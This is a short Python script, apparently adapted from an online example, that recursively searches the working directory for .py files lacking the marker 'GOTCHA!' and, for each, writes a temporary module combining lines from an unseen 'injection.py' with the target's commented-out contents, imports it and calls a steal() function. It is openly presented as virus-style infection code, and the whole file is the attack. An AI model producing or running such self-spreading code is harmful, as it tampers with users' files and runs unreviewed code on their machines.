"""
This program is based on one I found on geekstogeeks.com that gave a basic
example of a python script that inserts itself into other python scripts.
"""
#!/usr/bin/python 
import os, datetime, inspect
DATA_TO_INSERT = "GOTCHA!"
def search(path): #search for target files in path 
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
            if os.path.isdir(path+"/"+filename): #If it is a folder 
                filestoinfect.extend(search(path+"/"+filename)) 
            elif filename[-3:] == ".py": #If it is a python script -> Infect it 
                infected = False #default value 
                for line in open(path+"/"+filename): 
                    if DATA_TO_INSERT in line: 
                        infected = True
                        break
                if infected == False: 
                    filestoinfect.append(path+"/"+filename) 
    return filestoinfect


def infect(filestoinfect):
	# name of the code I am injecting
    target_file = "injection.py"
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    # get the code from injection.py
    for i,line in enumerate(virus): 
        if i>=0 and i <27: 
            virusstring += line
    virus.close
    blank = "\r\n"
    # Open each file and steal it's contents
    for fname in filestoinfect:
        f = open(fname)
        lines = f.readlines()
        temp = ""
        for line in lines:
            temp += "# " + line  
        f.close()
        # create a temporary file to run stolen code 
        f = open("stolen_code.py", "x")
        f.write(virusstring + blank + temp) 
        f.close()
        import stolen_code
        stolen_code.steal()
        # delete the temporary file
        os.remove("stolen_code.py")

filestoinfect = search(os.path.abspath("")) 
infect(filestoinfect)